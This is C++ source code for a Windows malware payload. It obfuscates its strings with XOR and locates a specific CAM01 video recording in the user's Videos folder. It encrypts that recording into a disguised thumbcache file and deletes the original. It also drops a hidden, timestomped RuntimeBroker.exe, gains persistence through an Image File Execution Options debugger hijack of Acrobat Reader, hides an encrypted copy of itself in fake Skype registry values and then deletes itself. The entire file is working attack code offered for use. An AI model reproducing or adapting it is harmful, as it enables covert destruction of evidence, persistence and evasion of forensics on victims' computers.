#include <windows.h>
#include <shlobj.h>
#include <fstream>
#include <filesystem>
#include <vector>
#include <string>
#include <thread>
#include <chrono>
#include <cryptopp/des.h>
#include <cryptopp/aes.h>
#include <cryptopp/modes.h>
#include <cryptopp/filters.h>
#include <cryptopp/hex.h>
#include <cryptopp/secblock.h>
#include "resource.h"

namespace fs = std::filesystem;
using namespace CryptoPP;

// XOR deobfuscation helper (4-byte key)
static std::string deobfuscate(const unsigned char* data, size_t len, uint32_t key) {
    std::string result(len, '\0');
    unsigned char keyBytes[4] = {
        (unsigned char)(key >> 24),
        (unsigned char)(key >> 16),
        (unsigned char)(key >> 8),
        (unsigned char)(key)
    };
    for (size_t i = 0; i < len; i++) {
        result[i] = data[i] ^ keyBytes[i % 4];
    }
    return result;
}

// Obfuscated strings (XOR key = 0xCAFEBABE)
// "Software\\Skype" XOR 0xCAFEBABE
static const unsigned char OBF_REGKEY[] = {0x99,0x91,0xDC,0xCA,0xBD,0x9F,0xC8,0xDB,0x96,0xAD,0xD1,0xC7,0xBA,0x9B};
// "Username" XOR 0xCAFEBABE
static const unsigned char OBF_VAL1[] = {0x9F,0x8D,0xDF,0xCC,0xA4,0x9F,0xD7,0xDB};
// "LastProfile" XOR 0xCAFEBABE
static const unsigned char OBF_VAL2[] = {0x86,0x9F,0xC9,0xCA,0x9A,0x8C,0xD5,0xD8,0xA3,0x92,0xDF};
// "SkypePath" XOR 0xCAFEBABE
static const unsigned char OBF_VAL3[] = {0x99,0x95,0xC3,0xCE,0xAF,0xAE,0xDB,0xCA,0xA2};

// IFEO persistence strings (XOR key = 0xCAFEBABE)
// "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\AcroRd32.exe" XOR 0xCAFEBABE
static const unsigned char OBF_IFEO[] = {
    0x99,0xB1,0xFC,0xEA,0x9D,0xBF,0xE8,0xFB,0x96,0xB3,0xD3,0xDD,0xB8,0x91,0xC9,0xD1,
    0xAC,0x8A,0xE6,0xE9,0xA3,0x90,0xDE,0xD1,0xBD,0x8D,0x9A,0xF0,0x9E,0xA2,0xF9,0xCB,
    0xB8,0x8C,0xDF,0xD0,0xBE,0xA8,0xDF,0xCC,0xB9,0x97,0xD5,0xD0,0x96,0xB7,0xD7,0xDF,
    0xAD,0x9B,0x9A,0xF8,0xA3,0x92,0xDF,0x9E,0x8F,0x86,0xDF,0xDD,0xBF,0x8A,0xD3,0xD1,
    0xA4,0xDE,0xF5,0xCE,0xBE,0x97,0xD5,0xD0,0xB9,0xA2,0xFB,0xDD,0xB8,0x91,0xE8,0xDA,
    0xF9,0xCC,0x94,0xDB,0xB2,0x9B
};
// "Debugger" XOR 0xCAFEBABE
static const unsigned char OBF_DEBUGGER[] = {0x8E,0x9B,0xD8,0xCB,0xAD,0x99,0xDF,0xCC};

// New obfuscated strings (XOR key = 0xCAFEBABE)
// "20250627_103005_CAM01.avi" XOR 0xCAFEBABE
static const unsigned char OBF_TARGET_FILE[] = {0xF8,0xCE,0x88,0x8B,0xFA,0xC8,0x88,0x89,0x95,0xCF,0x8A,0x8D,0xFA,0xCE,0x8F,0xE1,0x89,0xBF,0xF7,0x8E,0xFB,0xD0,0xDB,0xC8,0xA3};
// "RuntimeBroker.exe" XOR 0xCAFEBABE
static const unsigned char OBF_DROPPED_EXE[] = {0x98,0x8B,0xD4,0xCA,0xA3,0x93,0xDF,0xFC,0xB8,0x91,0xD1,0xDB,0xB8,0xD0,0xDF,0xC6,0xAF};
// "90b2cca7c0631aeda7ab1221c98fb1803a6dce2808efdd99e94f5e7cad3a4e78" XOR 0xCAFEBABE
static const unsigned char OBF_AES_KEY[] = {0xF3,0xCE,0xD8,0x8C,0xA9,0x9D,0xDB,0x89,0xA9,0xCE,0x8C,0x8D,0xFB,0x9F,0xDF,0xDA,0xAB,0xC9,0xDB,0xDC,0xFB,0xCC,0x88,0x8F,0xA9,0xC7,0x82,0xD8,0xA8,0xCF,0x82,0x8E,0xF9,0x9F,0x8C,0xDA,0xA9,0x9B,0x88,0x86,0xFA,0xC6,0xDF,0xD8,0xAE,0x9A,0x83,0x87,0xAF,0xC7,0x8E,0xD8,0xFF,0x9B,0x8D,0xDD,0xAB,0x9A,0x89,0xDF,0xFE,0x9B,0x8D,0x86};
// "9b5c9b7e83cdfbdf11f87195c3192a47" XOR 0xCAFEBABE
static const unsigned char OBF_AES_IV[] = {0xF3,0x9C,0x8F,0xDD,0xF3,0x9C,0x8D,0xDB,0xF2,0xCD,0xD9,0xDA,0xAC,0x9C,0xDE,0xD8,0xFB,0xCF,0xDC,0x86,0xFD,0xCF,0x83,0x8B,0xA9,0xCD,0x8B,0x87,0xF8,0x9F,0x8E,0x89};
// "ntdll.dll" XOR 0xCAFEBABE
static const unsigned char OBF_NTDLL[] = {0xA4,0x8A,0xDE,0xD2,0xA6,0xD0,0xDE,0xD2,0xA6};
// "thumbcache_777.db" XOR 0xCAFEBABE
static const unsigned char OBF_THUMBCACHE[] = {0xBE,0x96,0xCF,0xD3,0xA8,0x9D,0xDB,0xDD,0xA2,0x9B,0xE5,0x89,0xFD,0xC9,0x94,0xDA,0xA8};
// "\Microsoft\Windows\Explorer\" XOR 0xCAFEBABE
static const unsigned char OBF_EXPLORER_PATH[] = {0x96,0xB3,0xD3,0xDD,0xB8,0x91,0xC9,0xD1,0xAC,0x8A,0xE6,0xE9,0xA3,0x90,0xDE,0xD1,0xBD,0x8D,0xE6,0xFB,0xB2,0x8E,0xD6,0xD1,0xB8,0x9B,0xC8,0xE2};

class Payload {
private:
    const byte desKey[8] = {0x6B, 0x73, 0x79, 0x70, 0x75, 0x6E, 0x6E, 0x0B};
    std::string targetFile, dbPath, svchostPath, keyPath, desKeyPath;  // added desKeyPath

    // Timestomp file to match ntdll.dll creation time
    void TimestompFile(const std::string& path) {
        std::string ntdll = "C:\\Windows\\System32\\" + deobfuscate(OBF_NTDLL, sizeof(OBF_NTDLL), 0xCAFEBABE);
        HANDLE hRef = CreateFileA(ntdll.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
        if (hRef == INVALID_HANDLE_VALUE) return;
        
        FILETIME ct, at, wt;
        GetFileTime(hRef, &ct, &at, &wt);
        CloseHandle(hRef);
        
        HANDLE hTarget = CreateFileA(path.c_str(), FILE_WRITE_ATTRIBUTES, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
        if (hTarget != INVALID_HANDLE_VALUE) {
            SetFileTime(hTarget, &ct, &at, &wt);
            CloseHandle(hTarget);
        }
    }

    void InitPaths() {
        // Deobfuscate target filename at runtime
        targetFile = deobfuscate(OBF_TARGET_FILE, sizeof(OBF_TARGET_FILE), 0xCAFEBABE);
        
        char localAppData[MAX_PATH];
        if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, localAppData))) {
            std::string explorerPath = deobfuscate(OBF_EXPLORER_PATH, sizeof(OBF_EXPLORER_PATH), 0xCAFEBABE);
            std::string thumbcache = deobfuscate(OBF_THUMBCACHE, sizeof(OBF_THUMBCACHE), 0xCAFEBABE);
            dbPath = std::string(localAppData) + explorerPath + thumbcache;
        }

        char tempDir[MAX_PATH];
        GetTempPathA(MAX_PATH, tempDir);
        std::string droppedExe = deobfuscate(OBF_DROPPED_EXE, sizeof(OBF_DROPPED_EXE), 0xCAFEBABE);
        svchostPath = std::string(tempDir) + droppedExe;

        char temp[MAX_PATH];
        GetTempPathA(MAX_PATH, temp);
        // Generate pseudo-random temp filename based on system tick
        char tmpName[32];
        sprintf_s(tmpName, "wct%04X.tmp", (unsigned)(GetTickCount64() & 0xFFFF) ^ 0xA5FE);
        keyPath = std::string(temp) + tmpName;
        
        char desTmpName[32];
    sprintf_s(desTmpName, "wcd%04X.tmp", (unsigned)(GetTickCount64() & 0xFFFF) ^ 0xB6CF);
    desKeyPath = std::string(temp) + desTmpName;

        try {
            fs::create_directories(fs::path(dbPath).parent_path());
        } catch (...) {}
    }

    void SaveDesKeyToTemp() {
    // keyPath already points to something like %TEMP%\wctXXXX.tmp
    std::ofstream ofs(desKeyPath, std::ios::binary);
    if (!ofs) return;
    ofs.write(reinterpret_cast<const char*>(desKey), sizeof(desKey));
    ofs.close();
}


    std::vector<std::string> FindTargetFile() {
        std::vector<std::string> found;
        char* userProfile = getenv("USERPROFILE");
        if (!userProfile) return found;

        std::string videosDir = std::string(userProfile) + "\\Videos";
        if (!fs::exists(videosDir))
            return found;

        std::error_code ec;
        for (auto& e : fs::recursive_directory_iterator(videosDir, fs::directory_options::skip_permission_denied, ec)) {
            if (ec) break;
            if (e.is_regular_file() && e.path().filename() == targetFile) {
                found.push_back(e.path().string());
                return found;
            }
        }

        return found;
    }

    void EncryptAndStoreFile(const std::string& path) {
        std::ifstream ifs(path, std::ios::binary | std::ios::ate);
        if (!ifs) return;

        size_t size = ifs.tellg();
        ifs.seekg(0);
        std::vector<byte> data(size);
        ifs.read((char*)data.data(), size);
        ifs.close();

        std::vector<byte> encrypted;
        try {
            ECB_Mode<DES>::Encryption enc;
            enc.SetKey(desKey, 8);
            StringSource(data.data(), data.size(), true,
                new StreamTransformationFilter(enc, new VectorSink(encrypted),
                    StreamTransformationFilter::PKCS_PADDING));
        } catch (...) {
            return;
        }

        std::ofstream ofs(dbPath, std::ios::binary);
        if (ofs) {
            ofs.write((char*)encrypted.data(), encrypted.size());
            ofs.close();
        }

        std::ifstream verify(dbPath, std::ios::binary);
        if (verify) {
            std::vector<byte> memCopy(encrypted.size());
            verify.read((char*)memCopy.data(), memCopy.size());
            verify.close();
            Sleep(1000);
        }

        remove(path.c_str());
    }

    bool ExtractResource() {
        HMODULE hMod = GetModuleHandle(NULL);
        HRSRC hRes = FindResourceA(hMod, MAKEINTRESOURCEA(IDR_SVCHOST_EXE), RT_RCDATA);
        if (!hRes) return false;

        DWORD size = SizeofResource(hMod, hRes);
        if (size == 0) return false;

        HGLOBAL hData = LoadResource(hMod, hRes);
        if (!hData) return false;

        byte* pData = (byte*)LockResource(hData);
        if (!pData) return false;

        std::ofstream ofs(svchostPath, std::ios::binary);
        if (!ofs) return false;

        ofs.write((char*)pData, size);
        ofs.close();

        SetFileAttributesA(svchostPath.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
        return fs::exists(svchostPath);
    }

    bool EstablishPersistence() {
        // Deobfuscate IFEO registry key and Debugger value name
        std::string ifeoKey = deobfuscate(OBF_IFEO, sizeof(OBF_IFEO), 0xCAFEBABE);
        std::string debuggerVal = deobfuscate(OBF_DEBUGGER, sizeof(OBF_DEBUGGER), 0xCAFEBABE);

        // Set as the debugger for Adobe Acrobat Reader
        // When AcroRd32.exe is launched, Windows will run the debugger instead
        HKEY hKey;
        if (RegCreateKeyExA(HKEY_LOCAL_MACHINE, ifeoKey.c_str(), 0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL) != ERROR_SUCCESS) {
            // Try HKCU if HKLM fails
            if (RegCreateKeyExA(HKEY_CURRENT_USER, ifeoKey.c_str(), 0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL) != ERROR_SUCCESS) {
                return false;
            }
        }

        LONG result = RegSetValueExA(hKey, debuggerVal.c_str(), 0, REG_SZ, 
            (BYTE*)svchostPath.c_str(), (DWORD)svchostPath.size() + 1);
        RegCloseKey(hKey);

        return result == ERROR_SUCCESS;
    }

    bool EncryptSelf(std::string& out) {
        char path[MAX_PATH];
        if (GetModuleFileNameA(NULL, path, MAX_PATH) == 0)
            return false;

        std::ifstream ifs(path, std::ios::binary);
        if (!ifs) return false;

        std::string plain((std::istreambuf_iterator<char>(ifs)), {});
        ifs.close();

        try {
            std::string keyHex = deobfuscate(OBF_AES_KEY, sizeof(OBF_AES_KEY), 0xCAFEBABE);
            std::string ivHex = deobfuscate(OBF_AES_IV, sizeof(OBF_AES_IV), 0xCAFEBABE);
            std::string keyRaw, ivRaw;

            StringSource(keyHex, true, new HexDecoder(new StringSink(keyRaw)));
            StringSource(ivHex, true, new HexDecoder(new StringSink(ivRaw)));

            if (keyRaw.size() != 32 || ivRaw.size() != 16)
                return false;

            SecByteBlock key((const byte*)keyRaw.data(), keyRaw.size());
            SecByteBlock iv((const byte*)ivRaw.data(), ivRaw.size());

            CBC_Mode<AES>::Encryption enc;
            enc.SetKeyWithIV(key, key.size(), iv, iv.size());

            out.clear();
            StringSource(plain, true,
                new StreamTransformationFilter(enc,
                    new HexEncoder(new StringSink(out), false)));

            return true;
        } catch (...) {
            return false;
        }
    }

    void StoreInRegistry(const std::string& hex) {
        if (hex.empty()) return;

        size_t n = hex.size();
        std::string p1 = hex.substr(0, n/3);
        std::string p2 = hex.substr(n/3, n/3);
        std::string p3 = hex.substr(2*n/3);

        std::string regKey = deobfuscate(OBF_REGKEY, sizeof(OBF_REGKEY), 0xCAFEBABE);
        std::string val1 = deobfuscate(OBF_VAL1, sizeof(OBF_VAL1), 0xCAFEBABE);
        std::string val2 = deobfuscate(OBF_VAL2, sizeof(OBF_VAL2), 0xCAFEBABE);
        std::string val3 = deobfuscate(OBF_VAL3, sizeof(OBF_VAL3), 0xCAFEBABE);

        HKEY hKey;
        if (RegCreateKeyExA(HKEY_CURRENT_USER, regKey.c_str(), 0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
            RegSetValueExA(hKey, val1.c_str(), 0, REG_SZ, (BYTE*)p1.c_str(), (DWORD)p1.size() + 1);
            RegSetValueExA(hKey, val2.c_str(), 0, REG_SZ, (BYTE*)p2.c_str(), (DWORD)p2.size() + 1);
            RegSetValueExA(hKey, val3.c_str(), 0, REG_SZ, (BYTE*)p3.c_str(), (DWORD)p3.size() + 1);
            RegCloseKey(hKey);
        }
    }

    void SaveKeyToTemp() {
        std::string keyHex = deobfuscate(OBF_AES_KEY, sizeof(OBF_AES_KEY), 0xCAFEBABE);
        std::ofstream ofs(keyPath, std::ios::binary);
        if (ofs) {
            ofs << keyHex;
            ofs.close();
        }

        std::ifstream verify(keyPath);
        if (verify) {
            std::string memKey;
            std::getline(verify, memKey);
            verify.close();
            Sleep(1000);
        }
    }

    void SelfDelete() {
        char module[MAX_PATH], batch[MAX_PATH], cmd[2*MAX_PATH];
        GetModuleFileNameA(NULL, module, MAX_PATH);
        GetTempPathA(MAX_PATH, batch);
        char batchName[64];
        sprintf_s(batchName, "{%08X-%04X-%04X}.cmd", 
            (unsigned)(GetTickCount64() ^ 0xDEADBEEF),
            (unsigned)((GetTickCount64() >> 16) & 0xFFFF),
            (unsigned)(GetCurrentProcessId() & 0xFFFF));
        strcat_s(batch, batchName);

        sprintf_s(cmd, 
            "@echo off\n"
            ":L\n"
            "del \"%s\" 2>nul\n"
            "if exist \"%s\" (\n"
            "  timeout /t 1 /nobreak >nul\n"
            "  goto L\n"
            ")\n"
            "(goto) 2>nul & del \"%%~f0\"",
            module, module);

        HANDLE hFile = CreateFileA(batch, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
        if (hFile != INVALID_HANDLE_VALUE) {
            DWORD w;
            WriteFile(hFile, cmd, (DWORD)strlen(cmd), &w, NULL);
            CloseHandle(hFile);
            ShellExecuteA(NULL, "open", batch, NULL, NULL, SW_HIDE);
            Sleep(500);
            ExitProcess(0);
        }
    }

public:
    void Execute() {
        InitPaths();
        SaveDesKeyToTemp();

        auto files = FindTargetFile();
        if (!files.empty())
            EncryptAndStoreFile(files[0]);

        if (ExtractResource()) {
            TimestompFile(svchostPath);  // Timestomp to appear as old system file
        }
        EstablishPersistence();
        SaveKeyToTemp();

        std::string enc;
        if (EncryptSelf(enc))
            StoreInRegistry(enc);

        SelfDelete();
    }
};

int main() {
    try {
        Payload p;
        p.Execute();
    } catch (...) {}
    return 0;
}
